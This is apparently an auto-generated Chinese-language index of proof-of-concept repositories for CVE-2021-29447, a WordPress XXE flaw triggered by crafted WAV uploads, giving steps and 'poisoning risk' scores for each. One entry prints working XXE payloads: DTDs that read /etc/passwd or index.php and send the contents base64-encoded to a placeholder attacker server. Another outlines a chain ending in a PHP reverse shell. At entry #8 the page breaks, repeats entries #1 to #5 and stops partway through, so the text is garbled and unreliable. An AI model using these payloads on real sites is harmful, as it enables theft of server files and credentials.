# CVE-2021-29447

> 📦 该CVE有 **19** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2021-29447-0xRar_CVE-2021-29447-PoC.md](../2021/CVE-2021-29447-0xRar_CVE-2021-29447-PoC.md)

## CVE-2021-29447-WordPress-XXE

**漏洞编号:** CVE-2021-29447

**漏洞类型:** XML 外部实体注入 (XXE)

**影响应用:** WordPress

**危害等级:** 高危，可能导致敏感文件泄露，服务器端请求伪造 (SSRF)

**影响版本:** 5.6.0 <= version < 5.7.1 (需要PHP 8环境)

**利用条件:** 需要 WordPress 站点运行在 PHP 8 环境，并具有文件上传权限（例如 Author 角色）

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2021-29447 是一个 WordPress 的 XXE 漏洞，存在于 5.6 到 5.7 版本中，且需要运行在 PHP 8 环境下。攻击者需要具备文件上传权限，比如拥有 Author 角色。漏洞原理是 WordPress 在处理上传的媒体文件时，特别是 WAVE 音频文件，其中使用的 ID3 解析库存在 XML 解析问题。攻击者可以构造恶意的 WAVE 文件，其中包含指向外部实体的 XML 代码，从而读取服务器上的任意文件，或进行服务器端请求伪造。

**利用方式:**

1.  攻击者首先需要一个具有文件上传权限的 WordPress 账户（如 Author）。
2.  攻击者构造一个包含恶意 XML 内容的 WAVE 文件（payload.wav）。该 XML 声明了一个外部实体，指向攻击者控制的服务器上的 DTD 文件。
3.  攻击者在自己的服务器上部署一个恶意的 DTD 文件（evil.dtd）。该 DTD 文件定义了另一个实体，用于读取目标服务器上的文件内容，并通过 HTTP 请求将内容发送给攻击者。
4.  攻击者将构造的恶意 WAVE 文件上传到 WordPress 的媒体库。
5.  当 WordPress 解析该 WAVE 文件时，会触发 XXE 漏洞，加载攻击者服务器上的 DTD 文件，并读取目标文件内容，将 base64 编码后的内容发送到攻击者的服务器。
6.  攻击者从 HTTP 请求中获取 base64 编码的数据，并进行解码，得到目标文件的内容。

**POC 代码分析:**

提供的 Python 脚本 `PoC.py` 用于自动化生成恶意的 `payload.wav` 和 `evil.dtd` 文件。该脚本需要指定攻击者的服务器 IP 地址、端口，以及要读取的目标文件路径。脚本还会启动一个简单的 PHP HTTP 服务器，用于接收目标服务器发送的请求。

**投毒风险评估:**

代码本身功能明确，就是用于生成payload和启动http server，没有发现任何隐藏的恶意代码或后门。decode.php只是用来解码base64数据，所以判定没有投毒风险。

**项目地址:** [0xRar/CVE-2021-29447-PoC](https://github.com/0xRar/CVE-2021-29447-PoC)

**漏洞详情:** [CVE-2021-29447](https://nvd.nist.gov/vuln/detail/CVE-2021-29447)

---

## POC #2

**来源**: [CVE-2021-29447-0xricksanchez_CVE-2021-29447.md](../2021/CVE-2021-29447-0xricksanchez_CVE-2021-29447.md)

## CVE-2021-29447 - WordPress Authenticated XXE attack in Media Library

**漏洞编号:** CVE-2021-29447

**漏洞类型:** XML External Entity (XXE) Injection

**影响应用:** WordPress

**危害等级:** 高危，可能导致敏感信息泄露

**影响版本:** >= 5.6.0, < 5.7.1 (需要 PHP 8)

**利用条件:** 需要具有文件上传权限（例如，作者角色），且WordPress运行在PHP 8环境下。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-29447 漏洞存在于 WordPress 5.6.0 到 5.7.1 版本之间，允许具有文件上传权限的用户（例如作者）通过媒体库上传包含恶意 XML 内容的文件，从而触发 XXE 攻击。漏洞利用依赖于 WordPress 使用 PHP 8，因为 PHP 8 对 XML 解析的处理方式使得 XXE 攻击成为可能。

**有效性：**
提供的 POC 代码 `expl.py` 针对的是利用 WAV 文件中的 iXML 块进行 XXE 注入。这个POC专门针对 WordPress BookingPress 插件 < 1.0.11，但该漏洞的描述是通用的，只要目标应用解析包含恶意 XML 的 iXML 块，就可能受到攻击。由于CVE-2021-29447描述的场景和POC有一定关联，判断该POC具有一定的有效性，可以尝试在受影响的 WordPress 版本上利用。

**投毒风险：**
代码中存在投毒的风险较低。`expl.py` 脚本的主要功能是生成包含 XXE payload 的恶意 WAV 文件。Payload 从命令行参数获取IP和端口，攻击者需要配置自己的HTTP服务来接收数据。`README.md` 中也描述了整个利用流程，从生成恶意文件到启动 HTTP 服务器再到解码数据。但是如果攻击者没有配置自己的服务器，可能会导致数据泄露到poc作者搭建的服务器。因此推断存在10%的投毒风险。

**利用方式：**
1.  **生成恶意 WAV 文件：** 运行 `expl.py` 脚本，指定攻击者控制的服务器 IP 地址和端口，生成包含 XXE payload 的 `exploit.wav` 文件。
2.  **启动 HTTP 服务器：** 在攻击者服务器上启动一个 HTTP 服务器，用于提供外部实体定义 (DTD)。
3.  **上传恶意文件：** 具有文件上传权限的 WordPress 用户将 `exploit.wav` 文件上传到媒体库。
4.  **触发 XXE：** WordPress 解析上传的 WAV 文件，当解析 iXML 块时，会尝试从攻击者控制的服务器下载 DTD 文件，从而触发 XXE 攻击，导致服务器上的文件被读取并以 Base64 编码的形式发送到攻击者的服务器。
5.  **解码数据：** 攻击者从 HTTP 服务器的日志中获取 Base64 编码的数据，并进行解码，获取被读取的文件内容。

**项目地址:** [0xricksanchez/CVE-2021-29447](https://github.com/0xricksanchez/CVE-2021-29447)

**漏洞详情:** [CVE-2021-29447](https://nvd.nist.gov/vuln/detail/CVE-2021-29447)

---

## POC #3

**来源**: [CVE-2021-29447-Abdulazizalsewedy_CVE-2021-29447.md](../2021/CVE-2021-29447-Abdulazizalsewedy_CVE-2021-29447.md)

## CVE-2021-29447-WordPress-XXE

**漏洞编号:** CVE-2021-29447

**漏洞类型:** XXE

**影响应用:** WordPress

**危害等级:** 高危，可能导致敏感文件泄露

**影响版本:** >= 5.6.0, < 5.7.1 (requires PHP 8)

**利用条件:** 需要 WordPress 运行在 PHP 8 环境，且攻击者需要具备上传文件的权限（如 Author 角色）

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2021-29447 是一个存在于 WordPress 5.6.0 到 5.7.1 版本的 XXE 漏洞。该漏洞允许具有上传文件权限的用户（例如，作者）通过上传包含恶意 XML 内容的文件（如特制的 WAVE 文件）来执行 XXE 攻击。

**有效性分析：**
根据提供的漏洞信息、搜索结果和漏洞利用代码，可以判断该漏洞的 POC 代码是有效的。漏洞库信息、搜索引擎结果和 POC 代码的 README.md 文件均描述了该漏洞的利用方式和影响。

**投毒风险分析：**
提供的漏洞利用代码（README.md）主要描述了漏洞的原理、利用方法和修复方案，并未发现明显的恶意代码或后门。其核心步骤包括：

1.  创建一个包含恶意 XML 内容的 WAVE 文件。
2.  搭建一个 HTTP 服务器，用于接收 XXE 攻击泄露的数据。
3.  将恶意 WAVE 文件上传到 WordPress 的媒体库。
4.  从 HTTP 服务器的日志中获取泄露的敏感信息（例如，wp-config.php 中的数据库凭据）。

虽然代码本身没有直接的投毒行为，但攻击者可能利用泄露的数据库凭据进一步入侵系统。因此，投毒风险较低，估计为 5%。

**利用方式分析：**
该漏洞的利用方式主要分为以下几个步骤：

1.  **权限获取：** 攻击者需要具备 WordPress 中上传文件的权限（如 Author 角色）。
2.  **恶意文件制作：** 攻击者需要构造一个恶意的 WAVE 文件，该文件包含指向外部实体的 XML 内容，用于触发 XXE 漏洞。DTD文件包含需要泄露的文件路径，例如 wp-config.php。
3.  **HTTP服务器搭建：** 攻击者需要搭建一个 HTTP 服务器，用于接收来自 WordPress 服务器的请求，这些请求包含通过 XXE 漏洞泄露的敏感信息。Zlib解码用于有效的提取数据
4.  **文件上传：** 攻击者将制作好的恶意 WAVE 文件上传到 WordPress 的媒体库。
5.  **信息泄露：** 当 WordPress 解析上传的 WAVE 文件时，会触发 XXE 漏洞，导致服务器向攻击者的 HTTP 服务器发送包含敏感信息的请求。
6.  **数据提取：** 攻击者从 HTTP 服务器的日志中提取泄露的敏感信息，例如 wp-config.php 文件中的数据库凭据。
7.  **后续利用：** 攻击者可以利用泄露的数据库凭据登录数据库，并进一步获取管理员权限，甚至控制整个 WordPress 网站。

**项目地址:** [Abdulazizalsewedy/CVE-2021-29447](https://github.com/Abdulazizalsewedy/CVE-2021-29447)

**漏洞详情:** [CVE-2021-29447](https://nvd.nist.gov/vuln/detail/CVE-2021-29447)

---

## POC #4

**来源**: [CVE-2021-29447-ArtemCyberLab_Project-Project-Chimera-Exploiting-a-Modern-WordPress-XXE-to-Pillage-Secrets-.md](../2021/CVE-2021-29447-ArtemCyberLab_Project-Project-Chimera-Exploiting-a-Modern-WordPress-XXE-to-Pillage-Secrets-.md)

## CVE-2021-29447 WordPress XXE

**漏洞编号:** CVE-2021-29447

**漏洞类型:** XML 外部实体注入 (XXE)

**影响应用:** WordPress

**危害等级:** 高危，可能导致敏感信息泄露，包括数据库凭据，并最终导致远程代码执行

**影响版本:** >= 5.6.0, < 5.7.1，需要PHP 8

**利用条件:** 需要具备上传文件的权限 (如 Author 角色)，服务器运行PHP 8，存在可利用的端口（如80,443,22,3306）

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

提供的漏洞利用代码展示了完整的攻击链，从信息收集到获取反向shell。漏洞CVE-2021-29447是WordPress媒体库中的XXE漏洞，该漏洞允许攻击者通过上传特制的恶意WAV文件读取服务器上的敏感文件，比如wp-config.php。漏洞利用过程如下：

1. **侦察和枚举：** 使用Nmap扫描目标主机，发现开放端口和服务版本。使用WPScan枚举用户名，并通过暴力破解获取有效凭据。
2. **XXE 漏洞利用：**  构造包含恶意XML内容的WAV文件，利用XML外部实体注入读取wp-config.php文件。需要搭建一个HTTP服务器来接收和处理泄露的数据。使用php脚本解码base64编码的数据，提取数据库凭据。
3. **数据库访问：** 使用获得的数据库凭据连接到MySQL数据库，提取用户表中的用户名和密码哈希。
4. **密码破解：** 使用John the Ripper破解用户密码哈希，获取明文密码。
5. **权限提升和远程代码执行：** 修改Hello Dolly插件，插入PHP反向shell代码。通过访问修改后的插件页面，触发反向shell连接到攻击者控制的机器。
6. **后渗透：**  在获取shell后，执行提权操作，查找敏感文件。

**关于投毒风险的分析:**

POC代码中包含完整的攻击链，本身并没有明显的投毒代码，但如果使用者不熟悉整个流程，直接复制粘贴执行，可能会留下后门，例如植入的PHP反向shell。此外，攻击者可能将接收泄露数据的 HTTP server  替换成一个恶意站点，窃取攻击者的信息。因此，判定存在一定概率的投毒风险，估计为10%。主要风险点在于使用者对代码理解程度不够，可能直接使用未经验证的代码。


**项目地址:** [ArtemCyberLab/Project-Project-Chimera-Exploiting-a-Modern-WordPress-XXE-to-Pillage-Secrets-](https://github.com/ArtemCyberLab/Project-Project-Chimera-Exploiting-a-Modern-WordPress-XXE-to-Pillage-Secrets-)

**漏洞详情:** [CVE-2021-29447](https://nvd.nist.gov/vuln/detail/CVE-2021-29447)

---

## POC #5

**来源**: [CVE-2021-29447-AssassinUKG_CVE-2021-29447.md](../2021/CVE-2021-29447-AssassinUKG_CVE-2021-29447.md)

## CVE-2021-29447 - WordPress XXE

**漏洞编号:** CVE-2021-29447

**漏洞类型:** XML 外部实体注入 (XXE)

**影响应用:** WordPress

**危害等级:** 高危，可能导致敏感信息泄露和服务器端请求伪造 (SSRF)

**影响版本:** >= 5.6.0, < 5.7.1 (在 PHP 8 环境下)

**利用条件:** 需要具备上传文件的权限 (如作者角色)，且服务器运行在 PHP 8 环境下。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-29447 漏洞存在于 WordPress 的媒体库中，当 WordPress 运行在 PHP 8 环境下时，具有上传文件权限的用户（例如作者）可以通过上传包含恶意 XML 内容的文件（如特制的 WAV 文件）来触发 XXE 漏洞。

**利用方式：**

1.  **构建恶意 WAV 文件：** 攻击者需要创建一个包含恶意 XML 声明的 WAV 文件。该 XML 声明包含一个外部实体引用，指向攻击者控制的远程 DTD 文件。

    ```xml
    <?xml version="1.0"?>
    <!DOCTYPE ANY[
        <!ENTITY % remote SYSTEM 'http://YOURSEVERIP:PORT/NAMEEVIL.dtd'>
        %remote;%init;%trick;
    ]>
    ```

2.  **创建恶意 DTD 文件：** 攻击者需要在自己的服务器上创建一个 DTD 文件，该文件定义了如何读取服务器上的文件，并将其发送回攻击者。例如，读取 `/etc/passwd` 文件并进行 Base64 编码。

    ```xml
    <!ENTITY % file SYSTEM "php://filter/zlib.deflate/read=convert.base64-encode/resource=/etc/passwd">
    <!ENTITY % init "<!ENTITY &#x25; trick SYSTEM 'http://YOURSERVERIP:PORT/?p=%file;'>" >
    ```

    或者，读取 WordPress 配置文件 `index.php`。

    ```xml
    <!ENTITY % file SYSTEM "php://filter/zlib.deflate/read=convert.base64-encode/resource=../index.php">
    <!ENTITY % init "<!ENTITY &#x25; trick SYSTEM 'http://YOURSERVERIP:PORT/?p=%file;'>" >
    ```

3.  **上传恶意 WAV 文件：** 攻击者通过 WordPress 后台的媒体库上传该恶意 WAV 文件。

4.  **触发 XXE：** WordPress 解析该 WAV 文件时，会尝试解析其中的 XML 内容，从而触发 XXE 漏洞，并从攻击者的服务器下载 DTD 文件。

5.  **获取文件内容：** 恶意 DTD 文件会指示 WordPress 读取目标文件（例如 `/etc/passwd` 或 `wp-config.php`），对其进行 Base64 编码，并通过 HTTP 请求将内容发送到攻击者的服务器。

**有效性：**

提供的 POC 代码有效，可以利用该漏洞读取服务器上的文件，或者进行 SSRF 攻击。搜索结果中的多个链接也证实了该漏洞的存在以及利用方式。

**投毒风险：**

代码中存在轻微的投毒风险。主要的风险点在于 DTD 文件是由攻击者提供的。虽然提供的 DTD 示例代码是用来读取文件，但攻击者可以在 DTD 文件中执行其他恶意操作，例如尝试执行代码。但是由于文件读取已经是该漏洞所能达到的最大危害之一。所以判断投毒风险为10%。该值评估仓库中是否隐藏有恶意或非预期行为的代码。例如，某些代码可能会在未经授权的情况下收集用户信息、安装后门或执行其他恶意活动。 

**项目地址:** [AssassinUKG/CVE-2021-29447](https://github.com/AssassinUKG/CVE-2021-29447)

**漏洞详情:** [CVE-2021-29447](https://nvd.nist.gov/vuln/detail/CVE-2021-29447)

---

## POC #6

**来源**: [CVE-2021-29447-G01d3nW01f_CVE-2021-29447.md](../2021/CVE-2021-29447-G01d3nW01f_CVE-2021-29447.md)

## CVE-2021-29447-WordPress-XXE

**漏洞编号:** CVE-2021-29447

**漏洞类型:** XXE (XML External Entity)

**影响应用:** WordPress

**危害等级:** 高危，可能导致敏感文件泄露

**影响版本:** >= 5.6.0, < 5.7.1 (PHP 8)

**利用条件:** 需要WordPress版本在5.6.0到5.7.1之间，并且运行在PHP 8环境下；需要具备上传文件的权限（如Author角色）

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

该漏洞存在于WordPress媒体库中，允许具有文件上传权限的用户利用XML解析漏洞执行XXE攻击。漏洞利用需要WordPress运行在PHP 8环境下，因为该漏洞利用了PHP 8中ID3库的一个缺陷。攻击者可以上传包含恶意XML代码的WAV文件，其中XML代码定义了外部实体，导致服务器尝试解析并加载外部资源。利用方式如下：

1.  攻击者准备一个恶意的DTD文件，该文件包含用于读取服务器文件或执行其他操作的实体。
2.  攻击者使用提供的Python脚本 (`evil-wav-dtd-xxe.py`) 生成一个包含指向恶意DTD的XML的WAV文件。 该脚本会创建一个DTD文件，其中包含一个实体来读取目标文件，并创建一个HTTP请求来将读取的文件内容发送到攻击者的服务器。
3.  攻击者通过WordPress媒体库上传生成的恶意WAV文件。
4.  当WordPress解析该WAV文件时，会触发XXE漏洞，导致服务器加载并执行恶意DTD文件中的指令，将目标服务器上的文件内容通过HTTP请求发送给攻击者。

**有效性评估：**

根据漏洞信息和搜索引擎结果，该漏洞是真实存在的，并且有公开的PoC代码。提供的PoC代码（`evil-wav-dtd-xxe.py`）可以生成恶意的WAV文件和DTD文件，用于利用该漏洞读取服务器上的敏感文件。因此，PoC代码是有效的。

**投毒风险评估：**

查看提供的PoC代码，该代码主要用于生成漏洞利用所需的WAV和DTD文件。 `evil-wav-dtd-xxe.py` 脚本本身的作用就是生成利用漏洞的payload， 从代码逻辑上看，不存在明显的恶意代码或后门。`readme.md` 仅仅是提供使用的说明。

**利用方式总结：**

1.  **权限要求：** 具有上传文件权限的WordPress用户（如Author角色）。
2.  **环境要求：** WordPress版本在5.6.0到5.7.1之间，运行在PHP 8环境下。
3.  **攻击步骤：**
    *   准备恶意DTD文件：该文件定义了读取服务器文件的实体，并将文件内容发送到攻击者控制的服务器。
    *   生成恶意WAV文件：使用`evil-wav-dtd-xxe.py`脚本生成包含指向恶意DTD文件的XML的WAV文件。
    *   上传恶意WAV文件：通过WordPress媒体库上传生成的WAV文件。
    *   触发XXE漏洞：WordPress解析WAV文件时，加载恶意DTD文件，读取服务器文件并通过HTTP请求发送给攻击者。


**项目地址:** [G01d3nW01f/CVE-2021-29447](https://github.com/G01d3nW01f/CVE-2021-29447)

**漏洞详情:** [CVE-2021-29447](https://nvd.nist.gov/vuln/detail/CVE-2021-29447)

---

## POC #7

**来源**: [CVE-2021-29447-M3l0nPan_wordpress-cve-2021-29447.md](../2021/CVE-2021-29447-M3l0nPan_wordpress-cve-2021-29447.md)

## CVE-2021-29447-WordPress-XXE

**漏洞编号:** CVE-2021-29447

**漏洞类型:** XXE

**影响应用:** WordPress

**危害等级:** 高危，可能导致敏感文件泄露

**影响版本:** >= 5.6.0, < 5.7.1，运行在PHP 8环境下

**利用条件:** 需要拥有上传文件权限（例如，作者权限），并且服务器运行在PHP 8环境下

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

该漏洞存在于WordPress的媒体库中，允许具有上传文件权限的用户通过上传包含恶意XML的音频文件（如WAV或MP3）来触发XXE漏洞。此漏洞要求WordPress运行在PHP 8环境下，因为该版本的PHP中使用的XML解析器存在缺陷。攻击者可以利用此漏洞读取服务器上的敏感文件。PoC利用了本地启动HTTP服务的方式来接收目标服务器发送的文件内容，相对安全。投毒风险极低，主要风险点在脚本第一行的`#!/usr/bin/dev python3`，存在一定的误导性，如果用户直接复制该代码，可能会导致执行失败，但对安全性没有影响。主要功能代码位于`wordpress-cve-2021-29447.py`文件中，实现了漏洞利用的全部流程，包括身份验证、恶意文件上传和文件读取。

**项目地址:** [M3l0nPan/wordpress-cve-2021-29447](https://github.com/M3l0nPan/wordpress-cve-2021-29447)

**漏洞详情:** [CVE-2021-29447](https://nvd.nist.gov/vuln/detail/CVE-2021-29447)

---

## POC #8

**来源**: [CVE-2021-29447-Tea-On_CVE-2021-29447-Authenticated-XXE-WordPress-5.6-5.7.md](../2021/CVE-2021-29447-Tea-On_CVE-2021-29447-Authenticated-XXE-WordPress-5.6-5.7.md)

# CVE-2021-29447

> 📦 该CVE有 **19** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2021-29447-0xRar_CVE-2021-29447-PoC.md](../2021/CVE-2021-29447-0xRar_CVE-2021-29447-PoC.md)

## CVE-2021-29447-WordPress-XXE

**漏洞编号:** CVE-2021-29447

**漏洞类型:** XML 外部实体注入 (XXE)

**影响应用:** WordPress

**危害等级:** 高危，可能导致敏感文件泄露，服务器端请求伪造 (SSRF)

**影响版本:** 5.6.0 <= version < 5.7.1 (需要PHP 8环境)

**利用条件:** 需要 WordPress 站点运行在 PHP 8 环境，并具有文件上传权限（例如 Author 角色）

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2021-29447 是一个 WordPress 的 XXE 漏洞，存在于 5.6 到 5.7 版本中，且需要运行在 PHP 8 环境下。攻击者需要具备文件上传权限，比如拥有 Author 角色。漏洞原理是 WordPress 在处理上传的媒体文件时，特别是 WAVE 音频文件，其中使用的 ID3 解析库存在 XML 解析问题。攻击者可以构造恶意的 WAVE 文件，其中包含指向外部实体的 XML 代码，从而读取服务器上的任意文件，或进行服务器端请求伪造。

**利用方式:**

1.  攻击者首先需要一个具有文件上传权限的 WordPress 账户（如 Author）。
2.  攻击者构造一个包含恶意 XML 内容的 WAVE 文件（payload.wav）。该 XML 声明了一个外部实体，指向攻击者控制的服务器上的 DTD 文件。
3.  攻击者在自己的服务器上部署一个恶意的 DTD 文件（evil.dtd）。该 DTD 文件定义了另一个实体，用于读取目标服务器上的文件内容，并通过 HTTP 请求将内容发送给攻击者。
4.  攻击者将构造的恶意 WAVE 文件上传到 WordPress 的媒体库。
5.  当 WordPress 解析该 WAVE 文件时，会触发 XXE 漏洞，加载攻击者服务器上的 DTD 文件，并读取目标文件内容，将 base64 编码后的内容发送到攻击者的服务器。
6.  攻击者从 HTTP 请求中获取 base64 编码的数据，并进行解码，得到目标文件的内容。

**POC 代码分析:**

提供的 Python 脚本 `PoC.py` 用于自动化生成恶意的 `payload.wav` 和 `evil.dtd` 文件。该脚本需要指定攻击者的服务器 IP 地址、端口，以及要读取的目标文件路径。脚本还会启动一个简单的 PHP HTTP 服务器，用于接收目标服务器发送的请求。

**投毒风险评估:**

代码本身功能明确，就是用于生成payload和启动http server，没有发现任何隐藏的恶意代码或后门。decode.php只是用来解码base64数据，所以判定没有投毒风险。

**项目地址:** [0xRar/CVE-2021-29447-PoC](https://github.com/0xRar/CVE-2021-29447-PoC)

**漏洞详情:** [CVE-2021-29447](https://nvd.nist.gov/vuln/detail/CVE-2021-29447)

---

## POC #2

**来源**: [CVE-2021-29447-0xricksanchez_CVE-2021-29447.md](../2021/CVE-2021-29447-0xricksanchez_CVE-2021-29447.md)

## CVE-2021-29447 - WordPress Authenticated XXE attack in Media Library

**漏洞编号:** CVE-2021-29447

**漏洞类型:** XML External Entity (XXE) Injection

**影响应用:** WordPress

**危害等级:** 高危，可能导致敏感信息泄露

**影响版本:** >= 5.6.0, < 5.7.1 (需要 PHP 8)

**利用条件:** 需要具有文件上传权限（例如，作者角色），且WordPress运行在PHP 8环境下。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-29447 漏洞存在于 WordPress 5.6.0 到 5.7.1 版本之间，允许具有文件上传权限的用户（例如作者）通过媒体库上传包含恶意 XML 内容的文件，从而触发 XXE 攻击。漏洞利用依赖于 WordPress 使用 PHP 8，因为 PHP 8 对 XML 解析的处理方式使得 XXE 攻击成为可能。

**有效性：**
提供的 POC 代码 `expl.py` 针对的是利用 WAV 文件中的 iXML 块进行 XXE 注入。这个POC专门针对 WordPress BookingPress 插件 < 1.0.11，但该漏洞的描述是通用的，只要目标应用解析包含恶意 XML 的 iXML 块，就可能受到攻击。由于CVE-2021-29447描述的场景和POC有一定关联，判断该POC具有一定的有效性，可以尝试在受影响的 WordPress 版本上利用。

**投毒风险：**
代码中存在投毒的风险较低。`expl.py` 脚本的主要功能是生成包含 XXE payload 的恶意 WAV 文件。Payload 从命令行参数获取IP和端口，攻击者需要配置自己的HTTP服务来接收数据。`README.md` 中也描述了整个利用流程，从生成恶意文件到启动 HTTP 服务器再到解码数据。但是如果攻击者没有配置自己的服务器，可能会导致数据泄露到poc作者搭建的服务器。因此推断存在10%的投毒风险。

**利用方式：**
1.  **生成恶意 WAV 文件：** 运行 `expl.py` 脚本，指定攻击者控制的服务器 IP 地址和端口，生成包含 XXE payload 的 `exploit.wav` 文件。
2.  **启动 HTTP 服务器：** 在攻击者服务器上启动一个 HTTP 服务器，用于提供外部实体定义 (DTD)。
3.  **上传恶意文件：** 具有文件上传权限的 WordPress 用户将 `exploit.wav` 文件上传到媒体库。
4.  **触发 XXE：** WordPress 解析上传的 WAV 文件，当解析 iXML 块时，会尝试从攻击者控制的服务器下载 DTD 文件，从而触发 XXE 攻击，导致服务器上的文件被读取并以 Base64 编码的形式发送到攻击者的服务器。
5.  **解码数据：** 攻击者从 HTTP 服务器的日志中获取 Base64 编码的数据，并进行解码，获取被读取的文件内容。

**项目地址:** [0xricksanchez/CVE-2021-29447](https://github.com/0xricksanchez/CVE-2021-29447)

**漏洞详情:** [CVE-2021-29447](https://nvd.nist.gov/vuln/detail/CVE-2021-29447)

---

## POC #3

**来源**: [CVE-2021-29447-Abdulazizalsewedy_CVE-2021-29447.md](../2021/CVE-2021-29447-Abdulazizalsewedy_CVE-2021-29447.md)

## CVE-2021-29447-WordPress-XXE

**漏洞编号:** CVE-2021-29447

**漏洞类型:** XXE

**影响应用:** WordPress

**危害等级:** 高危，可能导致敏感文件泄露

**影响版本:** >= 5.6.0, < 5.7.1 (requires PHP 8)

**利用条件:** 需要 WordPress 运行在 PHP 8 环境，且攻击者需要具备上传文件的权限（如 Author 角色）

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2021-29447 是一个存在于 WordPress 5.6.0 到 5.7.1 版本的 XXE 漏洞。该漏洞允许具有上传文件权限的用户（例如，作者）通过上传包含恶意 XML 内容的文件（如特制的 WAVE 文件）来执行 XXE 攻击。

**有效性分析：**
根据提供的漏洞信息、搜索结果和漏洞利用代码，可以判断该漏洞的 POC 代码是有效的。漏洞库信息、搜索引擎结果和 POC 代码的 README.md 文件均描述了该漏洞的利用方式和影响。

**投毒风险分析：**
提供的漏洞利用代码（README.md）主要描述了漏洞的原理、利用方法和修复方案，并未发现明显的恶意代码或后门。其核心步骤包括：

1.  创建一个包含恶意 XML 内容的 WAVE 文件。
2.  搭建一个 HTTP 服务器，用于接收 XXE 攻击泄露的数据。
3.  将恶意 WAVE 文件上传到 WordPress 的媒体库。
4.  从 HTTP 服务器的日志中获取泄露的敏感信息（例如，wp-config.php 中的数据库凭据）。

虽然代码本身没有直接的投毒行为，但攻击者可能利用泄露的数据库凭据进一步入侵系统。因此，投毒风险较低，估计为 5%。

**利用方式分析：**
该漏洞的利用方式主要分为以下几个步骤：

1.  **权限获取：** 攻击者需要具备 WordPress 中上传文件的权限（如 Author 角色）。
2.  **恶意文件制作：** 攻击者需要构造一个恶意的 WAVE 文件，该文件包含指向外部实体的 XML 内容，用于触发 XXE 漏洞。DTD文件包含需要泄露的文件路径，例如 wp-config.php。
3.  **HTTP服务器搭建：** 攻击者需要搭建一个 HTTP 服务器，用于接收来自 WordPress 服务器的请求，这些请求包含通过 XXE 漏洞泄露的敏感信息。Zlib解码用于有效的提取数据
4.  **文件上传：** 攻击者将制作好的恶意 WAVE 文件上传到 WordPress 的媒体库。
5.  **信息泄露：** 当 WordPress 解析上传的 WAVE 文件时，会触发 XXE 漏洞，导致服务器向攻击者的 HTTP 服务器发送包含敏感信息的请求。
6.  **数据提取：** 攻击者从 HTTP 服务器的日志中提取泄露的敏感信息，例如 wp-config.php 文件中的数据库凭据。
7.  **后续利用：** 攻击者可以利用泄露的数据库凭据登录数据库，并进一步获取管理员权限，甚至控制整个 WordPress 网站。

**项目地址:** [Abdulazizalsewedy/CVE-2021-29447](https://github.com/Abdulazizalsewedy/CVE-2021-29447)

**漏洞详情:** [CVE-2021-29447](https://nvd.nist.gov/vuln/detail/CVE-2021-29447)

---

## POC #4

**来源**: [CVE-2021-29447-ArtemCyberLab_Project-Project-Chimera-Exploiting-a-Modern-WordPress-XXE-to-Pillage-Secrets-.md](../2021/CVE-2021-29447-ArtemCyberLab_Project-Project-Chimera-Exploiting-a-Modern-WordPress-XXE-to-Pillage-Secrets-.md)

## CVE-2021-29447 WordPress XXE

**漏洞编号:** CVE-2021-29447

**漏洞类型:** XML 外部实体注入 (XXE)

**影响应用:** WordPress

**危害等级:** 高危，可能导致敏感信息泄露，包括数据库凭据，并最终导致远程代码执行

**影响版本:** >= 5.6.0, < 5.7.1，需要PHP 8

**利用条件:** 需要具备上传文件的权限 (如 Author 角色)，服务器运行PHP 8，存在可利用的端口（如80,443,22,3306）

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

提供的漏洞利用代码展示了完整的攻击链，从信息收集到获取反向shell。漏洞CVE-2021-29447是WordPress媒体库中的XXE漏洞，该漏洞允许攻击者通过上传特制的恶意WAV文件读取服务器上的敏感文件，比如wp-config.php。漏洞利用过程如下：

1. **侦察和枚举：** 使用Nmap扫描目标主机，发现开放端口和服务版本。使用WPScan枚举用户名，并通过暴力破解获取有效凭据。
2. **XXE 漏洞利用：**  构造包含恶意XML内容的WAV文件，利用XML外部实体注入读取wp-config.php文件。需要搭建一个HTTP服务器来接收和处理泄露的数据。使用php脚本解码base64编码的数据，提取数据库凭据。
3. **数据库访问：** 使用获得的数据库凭据连接到MySQL数据库，提取用户表中的用户名和密码哈希。
4. **密码破解：** 使用John the Ripper破解用户密码哈希，获取明文密码。
5. **权限提升和远程代码执行：** 修改Hello Dolly插件，插入PHP反向shell代码。通过访问修改后的插件页面，触发反向shell连接到攻击者控制的机器。
6. **后渗透：**  在获取shell后，执行提权操作，查找敏感文件。

**关于投毒风险的分析:**

POC代码中包含完整的攻击链，本身并没有明显的投毒代码，但如果使用者不熟悉整个流程，直接复制粘贴执行，可能会留下后门，例如植入的PHP反向shell。此外，攻击者可能将接收泄露数据的 HTTP server  替换成一个恶意站点，窃取攻击者的信息。因此，判定存在一定概率的投毒风险，估计为10%。主要风险点在于使用者对代码理解程度不够，可能直接使用未经验证的代码。


**项目地址:** [ArtemCyberLab/Project-Project-Chimera-Exploiting-a-Modern-WordPress-XXE-to-Pillage-Secrets-](https://github.com/ArtemCyberLab/Project-Project-Chimera-Exploiting-a-Modern-WordPress-XXE-to-Pillage-Secrets-)

**漏洞详情:** [CVE-2021-29447](https://nvd.nist.gov/vuln/detail/CVE-2021-29447)

---

## POC #5

**来源**: [CVE-2021-29447-AssassinUKG_CVE-2021-29447.md](../2021/CVE-2021-29447-AssassinUKG_CVE-2021-29447.md)

## CVE-2021-29447 - WordPress XXE

**漏洞编号:** CVE-2021-29447

**漏洞类型:** XML 外部实体注入 (XXE)

**影响应用:** WordPress

**危害等级:** 高危，可能导致敏感信息泄露和服务器端请求伪造 (SSRF)

**影响版本:** >= 5.6.0, < 5.7.1 (在 PHP 8 环境下)

**利用条件:** 需要具备上传文件的权限 (如作者角色)，且服务器运行在 PHP 8 环境下。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

